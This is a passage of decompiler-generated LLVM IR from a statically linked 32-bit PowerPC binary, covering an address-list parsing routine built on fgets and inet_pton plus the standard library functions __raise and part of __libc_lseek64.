  %v2_1000f880 = add i32 %v1_1000f880, 12
  %v3_1000f880 = inttoptr i32 %v2_1000f880 to i32*
  store i32 16, i32* %v3_1000f880, align 4
  %v0_1000f884 = load i32, i32* @r23, align 4
  %v1_1000f884 = load i32, i32* @r28, align 4
  %v2_1000f884 = add i32 %v1_1000f884, 16
  %v3_1000f884 = inttoptr i32 %v2_1000f884 to i32*
  store i32 %v0_1000f884, i32* %v3_1000f884, align 4
  br label %dec_label_pc_1000f888

dec_label_pc_1000f888:                            ; preds = %dec_label_pc_1000f82c, %dec_label_pc_1000f85c
  %v0_1000f888 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f888 = load i32, i32* @r28, align 4
  %v2_1000f888 = add i32 %v1_1000f888, 4
  %v3_1000f888 = inttoptr i32 %v2_1000f888 to i32*
  store i32 %v0_1000f888, i32* %v3_1000f888, align 4
  %v0_1000f88c = load i32, i32* @r28, align 4
  %v1_1000f88c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f88c = inttoptr i32 %v1_1000f88c to i32*
  store i32 %v0_1000f88c, i32* %v2_1000f88c, align 4
  br label %dec_label_pc_1000fa24

dec_label_pc_1000f894:                            ; preds = %dec_label_pc_1000f78c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000f8a4

dec_label_pc_1000f8a4:                            ; preds = %dec_label_pc_1000f804, %dec_label_pc_1000f894
  %v1_1000f8ac = phi i32 [ %v1_1000f8ac.pre, %dec_label_pc_1000f804 ], [ %arg8, %dec_label_pc_1000f894 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000f8ac = inttoptr i32 %v1_1000f8ac to i32*
  store i32 1, i32* %v2_1000f8ac, align 4
  br label %dec_label_pc_1000fa0c

dec_label_pc_1000f8b4:                            ; preds = %dec_label_pc_1000fa0c
  %v0_1000f8b4 = load i32, i32* @r24, align 4
  store i32 %v0_1000f8b4, i32* @r3, align 4
  store i32 268499136, i32* @lr, align 4
  %v2_1000f8bc = call i32 @__GI_strchr(i32 %v0_1000f8b4, i32 35)
  %v4_1000f8c0 = icmp eq i32 %v2_1000f8bc, 0
  br i1 %v4_1000f8c0, label %dec_label_pc_1000f8d0, label %dec_label_pc_1000f8c8

dec_label_pc_1000f8c8:                            ; preds = %dec_label_pc_1000f8b4
  %v3_1000f8bc = inttoptr i32 %v2_1000f8bc to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000f8bc, align 1
  br label %dec_label_pc_1000f8d0

dec_label_pc_1000f8d0:                            ; preds = %dec_label_pc_1000f8b4, %dec_label_pc_1000f8c8
  %v0_1000f8d0 = load i32, i32* @r24, align 4
  store i32 %v0_1000f8d0, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000f94c17 = inttoptr i32 %v0_1000f8d0 to i8*
  %v2_1000f94c18 = load i8, i8* %v1_1000f94c17, align 1
  %v3_1000f94c19 = zext i8 %v2_1000f94c18 to i32
  store i32 %v3_1000f94c19, i32* %r0.global-to-local, align 4
  %v3_1000f95021 = icmp eq i8 %v2_1000f94c18, 0
  br i1 %v3_1000f95021, label %dec_label_pc_1000f958, label %dec_label_pc_1000f8e8.preheader

dec_label_pc_1000f8dc:                            ; preds = %dec_label_pc_1000f8f8
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000f8e0 = inttoptr i32 %v0_1000f91c to i8*
  store i8 0, i8* %v3_1000f8e0, align 1
  %v0_1000f8e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f8e4 = add i32 %v0_1000f8e4, 1
  store i32 %v1_1000f8e4, i32* %r11.global-to-local, align 4
  %v1_1000f8e8 = inttoptr i32 %v1_1000f8e4 to i8*
  %v2_1000f8e8 = load i8, i8* %v1_1000f8e8, align 1
  %v3_1000f8e8 = zext i8 %v2_1000f8e8 to i32
  store i32 %v3_1000f8e8, i32* %r0.global-to-local, align 4
  %v3_1000f8ec = icmp eq i8 %v2_1000f8e8, 0
  br i1 %v3_1000f8ec, label %dec_label_pc_1000f958, label %dec_label_pc_1000f8f8

dec_label_pc_1000f8f8:                            ; preds = %dec_label_pc_1000f8e8.preheader, %dec_label_pc_1000f8dc
  %v0_1000f91c = phi i32 [ %v1_1000f8e4, %dec_label_pc_1000f8dc ], [ %v0_1000f8e82, %dec_label_pc_1000f8e8.preheader ]
  %v0_1000f900.in = phi i32 [ %v3_1000f8e8, %dec_label_pc_1000f8dc ], [ %v3_1000f8e85, %dec_label_pc_1000f8e8.preheader ]
  %v0_1000f900 = mul nuw nsw i32 %v0_1000f900.in, 2
  %v3_1000f8fc = load i32, i32* @global_var_100249e8, align 4
  store i32 %v3_1000f8fc, i32* %r9.global-to-local, align 4
  %v2_1000f900 = add i32 %v3_1000f8fc, %v0_1000f900
  %v3_1000f900 = inttoptr i32 %v2_1000f900 to i16*
  %v4_1000f900 = load i16, i16* %v3_1000f900, align 2
  %v5_1000f900 = zext i16 %v4_1000f900 to i32
  store i32 %v5_1000f900, i32* %r0.global-to-local, align 4
  %v1_1000f904 = and i32 %v5_1000f900, 32
  store i32 %v1_1000f904, i32* %r9.global-to-local, align 4
  %v3_1000f904 = icmp eq i32 %v1_1000f904, 0
  br i1 %v3_1000f904, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f8dc

dec_label_pc_1000f90c:                            ; preds = %dec_label_pc_1000f8f8
  %v0_1000f90c = load i32, i32* @r29, align 4
  %v2_1000f90c = icmp sgt i32 %v0_1000f90c, 6
  br i1 %v2_1000f90c, label %dec_label_pc_1000f928.preheader, label %dec_label_pc_1000f914

dec_label_pc_1000f914:                            ; preds = %dec_label_pc_1000f90c
  %v1_1000f914 = mul i32 %v0_1000f90c, 4
  store i32 %v1_1000f914, i32* %r0.global-to-local, align 4
  %v1_1000f918 = add i32 %v0_1000f90c, 1
  store i32 %v1_1000f918, i32* @r29, align 4
  %v1_1000f91c = load i32, i32* @r30, align 4
  %v3_1000f91c = add i32 %v1_1000f91c, %v1_1000f914
  %v4_1000f91c = inttoptr i32 %v3_1000f91c to i32*
  store i32 %v0_1000f91c, i32* %v4_1000f91c, align 4
  %v0_1000f9289.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f928.preheader

dec_label_pc_1000f928.preheader:                  ; preds = %dec_label_pc_1000f914, %dec_label_pc_1000f90c
  %v0_1000f9289 = phi i32 [ %v0_1000f9289.pre, %dec_label_pc_1000f914 ], [ %v0_1000f91c, %dec_label_pc_1000f90c ]
  %v1_1000f92810 = inttoptr i32 %v0_1000f9289 to i8*
  %v2_1000f92811 = load i8, i8* %v1_1000f92810, align 1
  %v3_1000f92812 = zext i8 %v2_1000f92811 to i32
  store i32 %v3_1000f92812, i32* %r0.global-to-local, align 4
  %v3_1000f92c14 = icmp eq i8 %v2_1000f92811, 0
  br i1 %v3_1000f92c14, label %dec_label_pc_1000f94c.loopexit, label %dec_label_pc_1000f938.lr.ph

dec_label_pc_1000f938.lr.ph:                      ; preds = %dec_label_pc_1000f928.preheader
  %v3_1000f93c.pre = load i32, i32* @global_var_100249e8, align 4
  br label %dec_label_pc_1000f938

dec_label_pc_1000f924:                            ; preds = %dec_label_pc_1000f938
  %v1_1000f924 = add i32 %v0_1000f924, 1
  store i32 %v1_1000f924, i32* %r11.global-to-local, align 4
  %v1_1000f928 = inttoptr i32 %v1_1000f924 to i8*
  %v2_1000f928 = load i8, i8* %v1_1000f928, align 1
  %v3_1000f928 = zext i8 %v2_1000f928 to i32
  store i32 %v3_1000f928, i32* %r0.global-to-local, align 4
  %v3_1000f92c = icmp eq i8 %v2_1000f928, 0
  br i1 %v3_1000f92c, label %dec_label_pc_1000f94c.loopexit, label %dec_label_pc_1000f938

dec_label_pc_1000f938:                            ; preds = %dec_label_pc_1000f938.lr.ph, %dec_label_pc_1000f924
  %v0_1000f924 = phi i32 [ %v0_1000f9289, %dec_label_pc_1000f938.lr.ph ], [ %v1_1000f924, %dec_label_pc_1000f924 ]
  %v0_1000f940.in = phi i32 [ %v3_1000f92812, %dec_label_pc_1000f938.lr.ph ], [ %v3_1000f928, %dec_label_pc_1000f924 ]
  %v0_1000f940 = mul nuw nsw i32 %v0_1000f940.in, 2
  store i32 %v3_1000f93c.pre, i32* %r9.global-to-local, align 4
  %v2_1000f940 = add i32 %v0_1000f940, %v3_1000f93c.pre
  %v3_1000f940 = inttoptr i32 %v2_1000f940 to i16*
  %v4_1000f940 = load i16, i16* %v3_1000f940, align 2
  %v5_1000f940 = zext i16 %v4_1000f940 to i32
  store i32 %v5_1000f940, i32* %r0.global-to-local, align 4
  %v1_1000f944 = and i32 %v5_1000f940, 32
  store i32 %v1_1000f944, i32* %r9.global-to-local, align 4
  %v3_1000f944 = icmp eq i32 %v1_1000f944, 0
  br i1 %v3_1000f944, label %dec_label_pc_1000f924, label %dec_label_pc_1000f94c.loopexit

dec_label_pc_1000f94c.loopexit:                   ; preds = %dec_label_pc_1000f938, %dec_label_pc_1000f924, %dec_label_pc_1000f928.preheader
  %v0_1000f94c = phi i32 [ %v0_1000f9289, %dec_label_pc_1000f928.preheader ], [ %v0_1000f924, %dec_label_pc_1000f938 ], [ %v1_1000f924, %dec_label_pc_1000f924 ]
  %v1_1000f94c = inttoptr i32 %v0_1000f94c to i8*
  %v2_1000f94c = load i8, i8* %v1_1000f94c, align 1
  %v3_1000f94c = zext i8 %v2_1000f94c to i32
  store i32 %v3_1000f94c, i32* %r0.global-to-local, align 4
  %v3_1000f950 = icmp eq i8 %v2_1000f94c, 0
  br i1 %v3_1000f950, label %dec_label_pc_1000f958, label %dec_label_pc_1000f8e8.preheader

dec_label_pc_1000f8e8.preheader:                  ; preds = %dec_label_pc_1000f8d0, %dec_label_pc_1000f94c.loopexit
  %v0_1000f8e82 = phi i32 [ %v0_1000f94c, %dec_label_pc_1000f94c.loopexit ], [ %v0_1000f8d0, %dec_label_pc_1000f8d0 ]
  %v1_1000f8e83 = inttoptr i32 %v0_1000f8e82 to i8*
  %v2_1000f8e84 = load i8, i8* %v1_1000f8e83, align 1
  %v3_1000f8e85 = zext i8 %v2_1000f8e84 to i32
  store i32 %v3_1000f8e85, i32* %r0.global-to-local, align 4
  %v3_1000f8ec7 = icmp eq i8 %v2_1000f8e84, 0
  br i1 %v3_1000f8ec7, label %dec_label_pc_1000f958, label %dec_label_pc_1000f8f8

dec_label_pc_1000f958:                            ; preds = %dec_label_pc_1000f94c.loopexit, %dec_label_pc_1000f8e8.preheader, %dec_label_pc_1000f8dc, %dec_label_pc_1000f8d0
  %v0_1000f958 = load i32, i32* @r29, align 4
  %v1_1000f95c = mul i32 %v0_1000f958, 4
  store i32 %v1_1000f95c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000f964 = load i32, i32* @r30, align 4
  %v3_1000f964 = add i32 %v2_1000f964, %v1_1000f95c
  %v4_1000f964 = inttoptr i32 %v3_1000f964 to i32*
  store i32 0, i32* %v4_1000f964, align 4
  %tmp55 = icmp slt i32 %v0_1000f958, 2
  br i1 %tmp55, label %dec_label_pc_1000fa0c, label %dec_label_pc_1000f96c

dec_label_pc_1000f96c:                            ; preds = %dec_label_pc_1000f958
  %v0_1000f96c = load i32, i32* %r18.global-to-local, align 4
  %v3_1000f96c = icmp eq i32 %v0_1000f96c, 1
  br i1 %v3_1000f96c, label %dec_label_pc_1000fa24, label %dec_label_pc_1000f974

dec_label_pc_1000f974:                            ; preds = %dec_label_pc_1000f96c
  %v3_1000f974 = icmp eq i32 %v0_1000f96c, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000f974, label %dec_label_pc_1000f980, label %dec_label_pc_1000f9ac.preheader

dec_label_pc_1000f9ac.preheader:                  ; preds = %dec_label_pc_1000f974
  %v1_1000f9ac23 = load i32, i32* @r29, align 4
  %v2_1000f9ac24 = icmp sgt i32 %v1_1000f9ac23, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000f9b429 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f9b429, i32* @r3, align 4
  br i1 %v2_1000f9ac24, label %dec_label_pc_1000f998, label %dec_label_pc_1000f9bc

dec_label_pc_1000f980:                            ; preds = %dec_label_pc_1000f974
  %v0_1000f980 = load i32, i32* @r30, align 4
  %v1_1000f980 = inttoptr i32 %v0_1000f980 to i32*
  %v2_1000f980 = load i32, i32* %v1_1000f980, align 4
  store i32 %v2_1000f980, i32* @r4, align 4
  %v0_1000f984 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000f988 = inttoptr i32 %v0_1000f984 to i8*
  %v3_1000f988 = call i32 @__GI_strcoll(i8* %v2_1000f988, i32 %v2_1000f980)
  %v3_1000f98c = icmp eq i32 %v3_1000f988, 0
  br i1 %v3_1000f98c, label %dec_label_pc_1000f9c4, label %dec_label_pc_1000fa0c

dec_label_pc_1000f998:                            ; preds = %dec_label_pc_1000f9ac.preheader, %dec_label_pc_1000f9a8
  %v1_1000f998 = phi i32 [ %v1_1000f9b0, %dec_label_pc_1000f9a8 ], [ 4, %dec_label_pc_1000f9ac.preheader ]
  %v0_1000f9b431 = phi i32 [ %v0_1000f9b4, %dec_label_pc_1000f9a8 ], [ %v0_1000f9b429, %dec_label_pc_1000f9ac.preheader ]
  %v0_1000f998 = load i32, i32* @r30, align 4
  %v2_1000f998 = add i32 %v0_1000f998, %v1_1000f998
  %v3_1000f998 = inttoptr i32 %v2_1000f998 to i32*
  %v4_1000f998 = load i32, i32* %v3_1000f998, align 4
  store i32 %v4_1000f998, i32* @r4, align 4
  %v2_1000f99c = call i32 @__GI_strcasecmp(i32 %v0_1000f9b431, i32 %v4_1000f998)
  %v3_1000f9a0 = icmp eq i32 %v2_1000f99c, 0
  %v0_1000f9bc.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f9a0, label %dec_label_pc_1000f998.dec_label_pc_1000f9bc_crit_edge, label %dec_label_pc_1000f9a8

dec_label_pc_1000f9a8:                            ; preds = %dec_label_pc_1000f998
  %v1_1000f9a8 = add i32 %v0_1000f9bc.pre, 1
  store i32 %v1_1000f9a8, i32* @r31, align 4
  %v1_1000f9ac = load i32, i32* @r29, align 4
  %v2_1000f9ac = icmp slt i32 %v1_1000f9a8, %v1_1000f9ac
  %v1_1000f9b0 = mul i32 %v1_1000f9a8, 4
  store i32 %v1_1000f9b0, i32* %r0.global-to-local, align 4
  %v0_1000f9b4 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f9b4, i32* @r3, align 4
  br i1 %v2_1000f9ac, label %dec_label_pc_1000f998, label %dec_label_pc_1000f9bc

dec_label_pc_1000f998.dec_label_pc_1000f9bc_crit_edge: ; preds = %dec_label_pc_1000f998
  %v1_1000f9bc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f9bc

dec_label_pc_1000f9bc:                            ; preds = %dec_label_pc_1000f9a8, %dec_label_pc_1000f998.dec_label_pc_1000f9bc_crit_edge, %dec_label_pc_1000f9ac.preheader
  %v1_1000f9bc = phi i32 [ %v1_1000f9bc.pre, %dec_label_pc_1000f998.dec_label_pc_1000f9bc_crit_edge ], [ %v1_1000f9ac23, %dec_label_pc_1000f9ac.preheader ], [ %v1_1000f9ac, %dec_label_pc_1000f9a8 ]
  %v0_1000f9bc = phi i32 [ %v0_1000f9bc.pre, %dec_label_pc_1000f998.dec_label_pc_1000f9bc_crit_edge ], [ 1, %dec_label_pc_1000f9ac.preheader ], [ %v1_1000f9a8, %dec_label_pc_1000f9a8 ]
  %v2_1000f9bc = icmp slt i32 %v0_1000f9bc, %v1_1000f9bc
  br i1 %v2_1000f9bc, label %dec_label_pc_1000f9c4, label %dec_label_pc_1000fa0c

dec_label_pc_1000f9c4:                            ; preds = %dec_label_pc_1000f980, %dec_label_pc_1000f9bc
  %v0_1000f9c4 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000f9c4 = icmp eq i32 %v0_1000f9c4, 2
  br i1 %v3_1000f9c4, label %dec_label_pc_1000f9cc, label %dec_label_pc_1000f9e8

dec_label_pc_1000f9cc:                            ; preds = %dec_label_pc_1000f9c4
  %v0_1000f9cc = load i32, i32* @r30, align 4
  %v1_1000f9cc = inttoptr i32 %v0_1000f9cc to i32*
  %v2_1000f9cc = load i32, i32* %v1_1000f9cc, align 4
  %v0_1000f9d4 = load i32, i32* @r25, align 4
  store i32 268499420, i32* @lr, align 4
  %v3_1000f9d8 = inttoptr i32 %v2_1000f9cc to i8*
  %v4_1000f9d8 = call i32 @inet_pton(i32 2, i8* %v3_1000f9d8, i32 %v0_1000f9d4)
  %v2_1000f9dc = icmp sgt i32 %v4_1000f9d8, 0
  br i1 %v2_1000f9dc, label %dec_label_pc_1000f82c, label %dec_label_pc_1000fa08

dec_label_pc_1000f9e8:                            ; preds = %dec_label_pc_1000f9c4
  %v3_1000f9e8 = icmp eq i32 %v0_1000f9c4, 10
  br i1 %v3_1000f9e8, label %dec_label_pc_1000f9f0, label %dec_label_pc_1000fa08

dec_label_pc_1000f9f0:                            ; preds = %dec_label_pc_1000f9e8
  %v0_1000f9f0 = load i32, i32* @r30, align 4
  %v1_1000f9f0 = inttoptr i32 %v0_1000f9f0 to i32*
  %v2_1000f9f0 = load i32, i32* %v1_1000f9f0, align 4
  %v0_1000f9f8 = load i32, i32* %r21.global-to-local, align 4
  store i32 268499456, i32* @lr, align 4
  %v3_1000f9fc = inttoptr i32 %v2_1000f9f0 to i8*
  %v4_1000f9fc = call i32 @inet_pton(i32 10, i8* %v3_1000f9fc, i32 %v0_1000f9f8)
  %v2_1000fa00 = icmp sgt i32 %v4_1000f9fc, 0
  br i1 %v2_1000fa00, label %dec_label_pc_1000f85c, label %dec_label_pc_1000fa08

dec_label_pc_1000fa08:                            ; preds = %dec_label_pc_1000f9cc, %dec_label_pc_1000f9e8, %dec_label_pc_1000f9f0
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000fa0c

dec_label_pc_1000fa0c:                            ; preds = %dec_label_pc_1000f9bc, %dec_label_pc_1000f980, %dec_label_pc_1000f958, %dec_label_pc_1000fa08, %dec_label_pc_1000f8a4
  %v0_1000fa0c = load i32, i32* @r24, align 4
  %v0_1000fa10 = load i32, i32* @r27, align 4
  %v0_1000fa14 = load i32, i32* @r20, align 4
  store i32 268499484, i32* @lr, align 4
  %v3_1000fa18 = call i32 @fgets(i32 %v0_1000fa0c, i32 %v0_1000fa10, i32 %v0_1000fa14)
  %v3_1000fa1c = icmp eq i32 %v3_1000fa18, 0
  br i1 %v3_1000fa1c, label %dec_label_pc_1000fa24, label %dec_label_pc_1000f8b4

dec_label_pc_1000fa24:                            ; preds = %dec_label_pc_1000fa0c, %dec_label_pc_1000f96c, %dec_label_pc_1000f888
  %v0_1000fa24 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000fa24 = icmp eq i32 %v0_1000fa24, 1
  br i1 %v3_1000fa24, label %dec_label_pc_1000fa3c, label %dec_label_pc_1000fa2c

dec_label_pc_1000fa2c:                            ; preds = %dec_label_pc_1000fa24
  %v0_1000fa2c = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000fa34.696 to i32), i32* @lr, align 4
  %v1_1000fa30 = inttoptr i32 %v0_1000fa2c to i16*
  %v2_1000fa30 = call i32 @__GI_fclose(i16* %v1_1000fa30)
  br label %dec_label_pc_1000fa3c

dec_label_pc_1000fa38:                            ; preds = %dec_label_pc_1000f7f0, %dec_label_pc_1000f7c0, %dec_label_pc_1000f7b8, %dec_label_pc_1000f7ac, %dec_label_pc_1000f79c, %dec_label_pc_1000f784, %dec_label_pc_1000f774
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000fa3c

dec_label_pc_1000fa3c:                            ; preds = %dec_label_pc_1000fa24, %dec_label_pc_1000fa2c, %dec_label_pc_1000f81c, %dec_label_pc_1000fa38
  store i32 %v0_1000f738, i32* %r0.global-to-local, align 4
  %v0_1000fa40 = load i32, i32* @r26, align 4
  ret i32 %v0_1000fa40

; uselistorder directives
  uselistorder i32 %v0_1000f9b4, { 1, 0 }
  uselistorder i32 %v1_1000f9a8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000f95c, { 1, 0 }
  uselistorder i32 %v0_1000f958, { 1, 0 }
  uselistorder i32 %v3_1000f8e85, { 1, 0 }
  uselistorder i32 %v0_1000f8e82, { 1, 0 }
  uselistorder i32 %v1_1000f914, { 1, 0 }
  uselistorder i32 %v0_1000f90c, { 1, 0, 2 }
  uselistorder i32 %v2_1000f8bc, { 1, 0 }
  uselistorder i32 %v0_1000f7ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f784.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000f750, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 5, 6, 9, 1, 2, 3, 7, 8, 4, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 44, 1, 27, 2, 28, 0, 7, 13, 47, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 17, 3, 11, 10, 46, 18, 45 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 10, 11, 12, 13, 0, 1, 2, 3, 14, 15, 16, 17, 18, 19, 20, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 6, { 28, 29, 30, 31, 32, 0, 1, 2, 20, 21, 22, 23, 10, 11, 34, 3, 24, 25, 6, 4, 26, 12, 27, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 33 }
  uselistorder i32* @global_var_100249e8, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 42, 43, 44, 0, 45, 46, 47, 13, 17, 48, 63, 8, 9, 10, 14, 49, 26, 27, 28, 29, 30, 31, 32, 33, 5, 6, 34, 35, 36, 69, 18, 40, 62, 19, 64, 65, 66, 67, 4, 20, 68, 1, 2, 7, 21, 3, 15, 52, 53, 54, 55, 70, 37, 38, 50, 51, 22, 23, 24, 25, 11, 12, 39, 16, 41, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 8, 9, 4 }
  uselistorder i32 36, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 4, 5, 3, 1, 0, 2 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 52, 11, 53, 54, 12, 55, 56, 0, 57, 58, 1, 59, 13, 60, 61, 26, 27, 62, 72, 73, 63, 64, 65, 66, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 41, 4, 23, 21, 49, 22, 74, 75, 87, 88, 89, 90, 67, 68, 42, 43, 44, 45, 46, 47, 84, 85, 86, 69, 2, 70, 71, 14, 15, 24, 25, 6, 8, 7, 16, 48, 17, 20, 50, 5, 51, 18, 76, 77, 78, 79, 80, 19, 81, 3, 82, 9, 10 }
  uselistorder i32* @r27, { 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 52, 12, 13, 6, 14, 3, 2, 53, 54, 55, 56, 61, 0, 62, 63, 64, 65, 73, 74, 75, 76, 77, 78, 20, 21, 85, 4, 86, 7, 87, 92, 15, 16, 83, 84, 79, 80, 81, 82, 88, 89, 90, 22, 23, 66, 67, 68, 24, 25, 5, 26, 27, 28, 29, 8, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 9, 10, 11, 91, 69, 70, 71, 72, 41, 42, 57, 58, 59, 60, 17, 18, 19 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 67, 45, 28, 25, 46, 47, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 48, 49, 29, 50, 51, 52, 53, 54, 55, 56, 0, 68, 69, 65, 39, 40, 41, 1, 21, 42, 43, 44, 22, 30, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, { 4, 111, 132, 5, 6, 225, 223, 224, 145, 226, 227, 228, 127, 7, 229, 230, 231, 232, 233, 234, 235, 8, 236, 9, 10, 11, 133, 237, 239, 146, 240, 241, 242, 12, 13, 128, 181, 14, 15, 182, 183, 184, 185, 186, 187, 243, 147, 16, 17, 298, 299, 148, 18, 19, 116, 20, 21, 22, 23, 24, 25, 251, 252, 149, 26, 27, 2, 28, 0, 188, 3, 29, 1, 253, 150, 30, 246, 247, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 300, 201, 117, 314, 321, 31, 32, 33, 34, 35, 301, 302, 36, 303, 37, 304, 38, 39, 164, 40, 41, 165, 42, 219, 220, 221, 270, 271, 272, 43, 166, 44, 45, 46, 167, 47, 168, 169, 278, 280, 279, 276, 277, 170, 171, 172, 173, 281, 282, 283, 284, 285, 286, 287, 288, 289, 48, 174, 49, 254, 151, 255, 256, 118, 50, 51, 257, 52, 258, 259, 260, 261, 262, 263, 129, 53, 264, 130, 305, 306, 202, 54, 55, 56, 131, 57, 138, 297, 58, 59, 238, 60, 61, 315, 316, 317, 152, 318, 319, 320, 62, 307, 308, 309, 114, 115, 310, 311, 153, 312, 313, 63, 64, 65, 66, 67, 68, 69, 70, 203, 71, 204, 205, 135, 206, 207, 208, 209, 210, 72, 73, 211, 212, 136, 213, 214, 137, 215, 216, 218, 74, 75, 112, 113, 217, 248, 76, 249, 154, 250, 244, 245, 77, 78, 119, 79, 175, 80, 120, 81, 82, 83, 84, 176, 155, 177, 178, 179, 180, 139, 141, 140, 142, 85, 86, 156, 161, 162, 87, 134, 88, 222, 143, 265, 157, 266, 267, 268, 269, 121, 89, 122, 90, 273, 91, 158, 144, 159, 92, 123, 160, 93, 94, 95, 124, 274, 125, 96, 126, 97, 98, 275, 99, 100, 101, 290, 102, 291, 103, 292, 104, 293, 105, 294, 106, 295, 107, 296, 108, 109, 110, 163 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000fa3c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fa0c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000fa08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f9c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f998, { 1, 0 }
  uselistorder label %dec_label_pc_1000f958, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f8e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000f938, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f888, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f784, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fa54 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268499564, i32* @lr, align 4
  %v0_1000fa68 = call i32 @__libc_getpid()
  %v0_1000fa70 = load i32, i32* @r29, align 4
  store i32 %v0_1000fa54, i32* @lr, align 4
  %v2_1000fa80 = call i32 @kill(i32 %v0_1000fa68, i32 %v0_1000fa70)
  ret i32 %v2_1000fa80

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000fa84 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000fab0 = call i32 @__asm_mfcr()
  %v1_1000fab4 = and i32 %v0_1000fab0, 268435456
  %v3_1000fab4 = icmp eq i32 %v1_1000fab4, 0
  store i32 %v0_1000fab0, i32* %r31.global-to-local, align 4
  store i32 %v0_1000fab0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000fab4, label %dec_label_pc_1000fad8, label %dec_label_pc_1000fac8

dec_label_pc_1000fac8:                            ; preds = %entry
  %v0_1000fac8 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000fad0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fad0 = inttoptr i32 %v0_1000fac8 to i32*
  store i32 %v0_1000fad0, i32* %v2_1000fad0, align 4
